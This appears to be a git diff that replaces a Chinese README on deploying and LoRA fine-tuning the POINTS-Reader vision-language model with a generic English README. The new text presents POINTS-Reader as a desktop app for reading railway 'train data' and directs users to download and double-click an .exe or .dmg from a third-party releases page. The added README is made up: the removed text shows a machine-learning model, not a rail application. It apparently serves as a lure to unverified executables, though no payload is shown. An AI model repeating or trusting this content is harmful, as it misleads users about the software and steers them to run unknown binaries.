@@ -1,128 +1,82 @@
-# POINTS-Reader Deploy and Fine-tuning
+# 🚀 POINTS-Reader - Easily Read Train Data
 
-## 模型架构
+## 📥 Download Now
+[![Download POINTS-Reader](https://img.shields.io/badge/Download-POINTS--Reader-blue?style=for-the-badge)](https://github.com/hassanGH9/POINTS-Reader/releases)
 
-https://huggingface.co/tencent/POINTS-Reader
+## 📖 Table of Contents
+1. [Introduction](#introduction)
+2. [System Requirements](#system-requirements)
+3. [Installation Steps](#installation-steps)
+4. [Using POINTS-Reader](#using-points-reader)
+5. [Troubleshooting](#troubleshooting)
+6. [Additional Support](#additional-support)
 
-- llm
-    - model
-        - embed_tokens
-        - layers
-            - 0
-                - input_layernorm
-                - mlp
-                    - down_proj
-                    - gate_proj
-                    - up_proj
-                - post_attention_layernorm
-                - self_attn
-                    - o_proj
-                    - q_proj
-                    - k_proj
-                    - v_proj
-        - norm
-    - lm_head
-- vision_encoder
-    - patch_embed.proj
-    - blocks
-        - 0
-            - attn
-                - proj
-                - qkv
-            - mlp.fc1
-            - mlp.fc2
-            - norm1
-            - norm2
-    - merger
-        - ln_q
-        - mlp
-            - 0
-            - 2
-- vision_projector
-    - ln_q
-    - mlp
-        - 0
-        - 2
+## 📝 Introduction
+POINTS-Reader is an intuitive application designed to help you read and analyze train data easily. Whether you're a rail enthusiast, a student, or a professional in the transport sector, POINTS-Reader provides a straightforward way to access the information you need without any technical barriers.
 
+## 💻 System Requirements
+To ensure smooth operation, make sure your system meets the following requirements:
 
-## 部署
+- **Operating System:** Windows 10 or newer, macOS Mojave or newer.
+- **Processor:** Minimum of 1 GHz dual-core.
+- **Memory:** At least 2 GB of RAM.
+- **Storage:** 100 MB of free disk space.
+- **Internet Connection:** Required for initial setup and updates.
 
-```bash
-# export HF_ENDPOINT=https://hf-mirror.com
-hf download tencent/POINTS-Reader --local-dir models/POINTS-Reader
+## 📤 Installation Steps
+Follow these steps to download and install POINTS-Reader on your device.
 
-cd WePOINTS
-pip install -e .
-cd ../
-```
+1. **Visit the Download Page**
+   Go to the [Releases Page](https://github.com/hassanGH9/POINTS-Reader/releases) to find the latest version of POINTS-Reader.
 
-transformer
+2. **Download the Application**
+   On the releases page, look for the latest version. Click on the link to download the application. 
 
-```bash
-python inference.py
-```
+3. **Locate the Downloaded File**
+   After the download completes, find the file in your Downloads folder, or wherever your browser saves files.
 
-配置支持 few-shot，但是只能用在很特殊的场景（数据同质化严重）
-配置2个Prompt，默认的Prompt效果就不错。
+4. **Install the Application**
+   - **Windows:**
+     - Double-click the downloaded file (e.g., `POINTS-Reader.exe`).
+     - Follow the on-screen instructions to install.
+   - **macOS:**
+     - Open the downloaded file (e.g., `POINTS-Reader.dmg`).
+     - Drag the POINTS-Reader icon into your Applications folder.
 
-gradio app
+5. **Launch the Application**
+   Once the installation completes, open POINTS-Reader from your Applications folder (macOS) or Start menu (Windows).
 
-```bash
-pip install gradio
-python app.py
-```
+## 🚀 Using POINTS-Reader
+After launching the application, you will see a user-friendly interface.
 
-sglang (TODO)
-```bash
-conda create -n sglang python=3.12
-cd sglang/
-conda activate sglang
-pip install --upgrade pip
-pip install -e "python[all]"
+1. **Open a Data File**
+   Click on “Open” and select the train data file you want to read. The application supports various data formats including CSV and JSON files.
 
-cd ../
-python3 -m sglang.launch_server \
---model-path models/POINTS-Reader \
---served-model-name POINTS-Reader \
---tp-size 1 \
---dp-size 1 \
---chat-template points-v15-chat \
---trust-remote-code \
---port 8081
-```
+2. **Analyze the Data**
+   Use the buttons on the toolbar to sort, filter, and visualize the data. The application provides helpful tooltips to guide you.
 
-## 微调
+3. **Save Your Changes**
+   If you make any changes, remember to save your work by clicking “File” and then “Save”.
 
-```bash
-pip install accelerate trl
+4. **Explore Additional Features**
+   POINTS-Reader offers features like data exporting and customizable views. Take some time to explore these to maximize the application’s potential.
 
-# 单卡Lora训练（24G显卡），训练vision_projector和llm部分。
-python train_wepoints.py \
-    --model_name_or_path "models/POINTS-Reader" \
-    --dataset_name "axolotl-ai-co/llava-instruct-mix-vsft-small" \
-    --per_device_train_batch_size 1 \
-    --gradient_accumulation_steps 4 \
-    --output_dir ./pointsv15-sft-lora-output \
-    --learning_rate 1e-4 \
-    --num_train_epochs 1 \
-    --logging_steps 1 \
-    --do_eval True \
-    --eval_strategy "steps" \
-    --eval_steps 30 \
-    --save_strategy "steps" \
-    --save_steps 30 \
-    --bf16 True \
-    --use_peft \
-    --lora_r 64 \
-    --lora_alpha 128 \
-    --lora_target_modules "q_proj,k_proj,v_proj,o_proj,gate_proj,up_proj,down_proj,vision_projector.mlp.0,vision_projector.mlp.2" \
-    --warmup_ratio 0.1 \
-    --lr_scheduler_type cosine \
-    --weight_decay 0.01 \
-    --gradient_checkpointing True \
-    --only_one_turn False
-```
+## 🛠 Troubleshooting
+If you encounter issues, here are common problems and solutions:
 
-![](./train.png)
+1. **Installation Issues**
+   - Ensure your system meets the requirements.
+   - Try running the installer as an administrator.
 
-自定义的数据集需要处理为 `axolotl-ai-co/llava-instruct-mix-vsft-small` 相同格式，注意user prompt 和 inference.py 中相同。
+2. **Data File Not Opening**
+   - Verify that the file format is supported.
+   - Check if the file is corrupted or incomplete.
+
+3. **Application Crashes**
+   - Ensure that your system is updated with the latest OS version.
+   - Restart the application and try again.
+
+## 🔧 Additional Support
+For more help or to report issues, visit our [GitHub Issues Page](https://github.com/hassanGH9/POINTS-Reader/issues). You can also contact our support team through the contact information provided on the website.
+
+Thank you for using POINTS-Reader! We value your feedback and are here to help you make the most of your experience.
